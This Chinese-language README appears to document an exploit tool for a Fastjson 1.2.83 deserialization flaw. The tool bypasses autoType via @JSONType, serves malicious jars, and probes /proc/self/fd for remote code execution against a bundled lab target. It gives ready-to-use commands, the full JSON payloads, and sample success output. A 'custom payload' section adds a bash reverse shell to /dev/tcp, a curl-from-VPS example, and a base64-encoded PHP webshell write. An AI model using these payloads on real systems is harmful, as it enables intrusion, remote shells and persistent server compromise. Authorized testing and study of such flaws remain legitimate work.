# Fastjson 1.2.83 @JSONType RCE

Fastjson 1.2.83 反序列化漏洞利用工具，基于 `@JSONType` 注解 + 文件描述符(FD)探测实现 RCE。

> ⚠️ **仅限授权安全测试和学习研究使用，请勿用于非法用途。**

---

## 目录结构

```
├── fastjson_vul.jar    # 靶场环境（存在漏洞的 Fastjson 服务）
├── fd_enum_exp.py      # 漏洞利用脚本（主程序）
├── Gen.java            # 恶意 class 生成器（ASM 字节码操作）
├── asm.jar             # ASM 字节码框架依赖
└── README.md
```

## 环境要求

| 要求 | 说明 |
|------|------|
| **操作系统** | 🐧 **仅支持 Linux**（靶场和攻击机都需要） |
| **JDK** | JDK 8（需要 `java`、`javac`、`jar` 命令） |
| **Python** | Python 3 + `requests` 库 |
| **网络** | 攻击机与靶机需互通 |

> ⚠️ **重要**：本工具仅在 Linux 环境下复现。Windows 下因路径格式、`/proc/self/fd/` 等机制差异无法正常工作。

---

## 靶场说明

`fastjson_vul.jar` 是预编译的漏洞靶场，内含一个使用 Fastjson 1.2.83 的 HTTP 服务，接受 JSON 输入并触发反序列化。

**启动靶场：**

```bash
java -jar fastjson_vul.jar
```

默认监听 `0.0.0.0:8081`，接受 POST 请求，JSON 解析端点为 `/parse`。

---

## 使用方法

### 1. 启动靶场（靶机）

```bash
java -jar fastjson_vul.jar
```

### 2. 运行利用脚本（攻击机）

```bash
python3 fd_enum_exp.py <target-url> <local-ip>
```

**参数说明：**

| 参数 | 说明 | 示例 |
|------|------|------|
| `target-url` | 靶场的漏洞端点 URL | `http://192.168.150.128:8081/parse` |
| `local-ip` | 攻击机 IP（靶机能访问到的） | `192.168.150.1` |
| `--cmd` | 自定义执行命令（可选） | `"curl http://vps:port/shell"` |

**示例：**

```bash
# 基本用法
python3 fd_enum_exp.py http://192.168.150.128:8081/parse 192.168.150.1

# 自定义命令
python3 fd_enum_exp.py http://192.168.150.128:8081/parse 192.168.150.1 --cmd "id > /tmp/pwned"
```

---

## 漏洞原理

### 漏洞背景

Fastjson 1.2.83 默认关闭了 `autoType`（即不允许通过 `@type` 自动加载任意类）。但由于对带有 `@JSONType` 注解的类做了特殊处理（白名单豁免），攻击者可以绕过 `autoType` 限制。

### 利用链路（两阶段扫描）

本工具将利用过程分为 **准备 + 两个扫描阶段**，先让靶机下载所有恶意 jar，再逐个探测 FD：

```
┌─────────────────────────────────────────────────────────────────┐
│  准备阶段：批量生成恶意 class，打进一个 jar                       │
│                                                                 │
│  对 fd 28..49 每个编号生成 E{num}.class                         │
│  （内部名 = jar:file:/proc/self/fd/{num}!/E{num}）              │
│  全部打进一个 jar，复制多份分别命名为 28, 29, ..., 49            │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  阶段一：POC1 — 批量触发靶机下载所有 jar（建立 FD 缓存）         │
│                                                                 │
│  依次发送：                                                     │
│    {"@type":"jar:http:<ip_dec>:8000.28!.E28","x":1}            │
│    {"@type":"jar:http:<ip_dec>:8000.29!.E29","x":1}            │
│    ...                                                          │
│    {"@type":"jar:http:<ip_dec>:8000.49!.E49","x":1}            │
│                                                                 │
│  → Fastjson 发现类有 @JSONType 注解，跳过 autoType 检查          │
│  → 类加载器通过 jar: URL 从攻击机 HTTP 服务器下载 jar             │
│  → JDK jar 缓存机制会保持该 jar 的文件描述符(FD)打开              │
└─────────────────────────────────────────────────────────────────┘
                            ↓
┌─────────────────────────────────────────────────────────────────┐
│  阶段二：POC2 — 逐个探测 FD，命中则触发 RCE                     │
│                                                                 │
│  依次发送：                                                     │
│    {"@type":"jar:file:.proc.self.fd.28!.E28","x":1}            │
│    {"@type":"jar:file:.proc.self.fd.29!.E29","x":1}            │
│    ...                                                          │
│                                                                 │
│  → 遍历 /proc/self/fd/28..49 寻找仍然打开的 jar FD              │
│  → 命中时，类加载器解析 jar URL 并定义恶意类                      │
│  → 类的静态初始化块 <clinit> 执行 → Runtime.exec() → RCE       │
└─────────────────────────────────────────────────────────────────┘
```

### 成功判断方式

1. **脚本输出 `HIT` 标记**：POC2 返回状态码非 500 时标记为命中
2. **检查靶机 `/tmp/PWNED` 文件**：默认 payload 会写入标记文件
3. **检查 HTTP 服务器访问日志**：靶机下载了哪个 FD 编号的 jar

**成功输出示例：**

```
[*] generating 22 E classes for fd 28..49 ...
[*] 1 jar with 22 classes, copied to 22 names (fd 28..49)
[*] HTTP server serving /path/serve on 0.0.0.0:8000
[*] sweeping fd 28..49, stop when POC2 status != 500
{"@type": "jar:file:.proc.self.fd.28!.E28", "x": 1}
{"@type": "jar:file:.proc.self.fd.29!.E29", "x": 1}
{"@type": "jar:file:.proc.self.fd.30!.E30", "x": 1}  <-- HIT

[+] SUCCESS - fd 30 matched (POC2 status 200)
    POC1: {"@type": "jar:http:..3232235777:8000.30!.E30", "x": 1}
    POC2: {"@type": "jar:file:.proc.self.fd.30!.E30", "x": 1}
[*] check the target for the marker (default: /tmp/PWNED)
```

**验证 RCE：**

```bash
# 在靶机上检查
cat /tmp/PWNED
```

---

## 自定义 Payload

通过 `--cmd` 参数可以自定义执行的命令：

```bash
# 反弹 shell
python3 fd_enum_exp.py http://target:8081/parse 10.0.0.1 --cmd "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

# 写入 webshell
python3 fd_enum_exp.py http://target:8081/parse 10.0.0.1 --cmd "echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/shell.php"
```

---

## 参考

- [dinosn/fastjson-jsontype-rce-lab](https://github.com/dinosn/fastjson-jsontype-rce-lab)
- [Fastjson @JSONType RCE 深入分析](https://mp.weixin.qq.com/s/hyKifHPIa9_cI8bzCulSVQ)

## 免责声明

本工具仅供安全研究和授权渗透测试使用。使用者应遵守当地法律法规，因使用本工具造成的任何后果由使用者自行承担。
